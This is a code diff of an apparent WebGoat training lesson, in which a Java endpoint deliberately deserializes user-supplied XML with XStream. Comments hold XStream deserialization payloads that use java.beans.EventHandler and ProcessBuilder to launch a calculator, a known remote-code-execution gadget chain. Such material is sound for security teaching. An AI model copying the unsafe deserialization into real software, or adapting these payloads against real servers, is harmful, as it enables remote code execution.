@@ -24,54 +24,83 @@ package org.owasp.webgoat.vulnerable_components;
 
 import com.thoughtworks.xstream.XStream;
 import com.thoughtworks.xstream.io.xml.DomDriver;
+
+import org.apache.commons.lang3.StringUtils;
 import org.owasp.webgoat.assignments.AssignmentEndpoint;
+import org.owasp.webgoat.assignments.AssignmentHints;
 import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.web.bind.annotation.*;
 
 @RestController
-//@AssignmentHints({"http-basics.hints.http_basics_lesson.1"})
+@AssignmentHints({"vulnerable.hint"})
 public class VulnerableComponentsLesson extends AssignmentEndpoint {
+	
+	
+	/*
+	 * 
+<contact class='org.owasp.webgoat.vulnerable_components.Contact'>
+  <handler class='java.beans.EventHandler'>
+    <target class='java.lang.ProcessBuilder'>
+      <command>
+        <string>calc.exe</string>
+      </command>
+    </target>
+    <action>start</action>
+  </handler>
+</contact>
+
+<contact class='dynamic-proxy'>
+<interface>org.owasp.webgoat.vulnerable_components.Contact</interface>
+  <handler class='java.beans.EventHandler'>
+    <target class='java.lang.ProcessBuilder'>
+      <command>
+        <string>calc.exe</string>
+      </command>
+    </target>
+    <action>start</action>
+  </handler>
+</contact>
+	 */
 
     @PostMapping("/VulnerableComponents/attack1")
     public @ResponseBody
     AttackResult completed(@RequestParam String payload) {
-        XStream xstream = new XStream(new DomDriver());
+        XStream xstream = new XStream(/*new DomDriver()*/);
         xstream.setClassLoader(Contact.class.getClassLoader());
 
-        xstream.processAnnotations(Contact.class);
-//        xstream.registerConverter(new ContactConverter());
-//        xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);
+        //xstream.processAnnotations(Contact.class);
+        xstream.alias("contact", ContactImpl.class);
+        //xstream.aliasField("id", Contact.class, "id");
+        xstream.ignoreUnknownElements();
+        //xstream.registerConverter(new ContactConverter());
+        //xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);
 
-//        Contact c = new Contact();
-//        c.setName("Alvaro");
-//        String sc = xstream.toXML(c);
-//        System.out.println(sc);
-
-
-//        String payload2 = "<sorted-set>" +
-//                "<string>foo</string>" +
-//                "<dynamic-proxy>" +
-//                "<interface>java.lang.Comparable</interface>" +
-//                "<handler class=\"java.beans.EventHandler\">" +
-//                " <target class=\"java.lang.ProcessBuilder\">" +
-//                " <command>" +
-//                " <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>" +
-//                " </command>" +
-//                " </target>" +
-//                " <action>start</action>" +
-//                "</handler>" +
-//                "</dynamic-proxy>" +
-//                "</sorted-set>";
-
+        Contact contact = null;
+        
         try {
-//        	System.out.println("Payload:" + payload);
-            Contact expl = (Contact) xstream.fromXML(payload);
-            return success(this).feedback("vulnerable-components.fromXML").feedbackArgs(expl.toString()).build();
-        } catch (com.thoughtworks.xstream.converters.ConversionException ex) {
-            if (ex.getMessage().contains("Integer")) {
-                return success(this).feedback("vulnerable-components.success").build();
-            }
-            return failed(this).feedback("vulnerable-components.close").build();
+        
+        	
+        	if (!StringUtils.isEmpty(payload)) {
+        		//payload = payload.replace("contact ", "<contact ").replace("/contact ", "</contact");
+        		payload = payload.replace("+", "").replace("\r", "").replace("\n", "").replace("> ", ">").replace(" <", "<");
+        	}
+        	System.out.println(payload);
+        	
+            contact = (Contact) xstream.fromXML(payload);
+          
+            
+        } catch (Exception ex) {
+            return failed(this).feedback("vulnerable-components.close").output(ex.getMessage()).build();
         }
+        
+        try {
+            if (null!=contact) {
+            	contact.getFirstName();//trigger the example like https://x-stream.github.io/CVE-2013-7285.html
+            }
+        } catch (Exception e) {
+        	e.printStackTrace();
+        	return success(this).feedback("vulnerable-components.success").build();
+        }
+        return failed(this).feedback("vulnerable-components.fromXML").feedbackArgs(contact).build();
     }
 }
